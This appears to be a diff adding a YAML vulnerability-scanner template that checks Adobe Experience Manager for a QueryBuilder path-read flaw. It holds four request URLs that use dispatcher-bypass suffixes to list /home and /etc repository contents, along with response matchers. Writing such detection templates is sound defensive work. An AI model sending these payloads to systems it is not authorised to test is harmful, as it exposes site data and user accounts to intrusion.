@@ -1,0 +1,27 @@
+id: aem-querybuilder-internal-path-read
+brief:
+    title: AEM QueryBuilder Internal Path Read
+    by: DhiyaneshDk
+    level: medium
+    about: AEM QueryBuilder is vulnerable to LFI.
+    label:
+        - aem
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1'
+        - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1'
+        - '{{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1'
+        - '{{BaseURL}}/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - jcr:path
+            - success
+          in: body
+          need: all
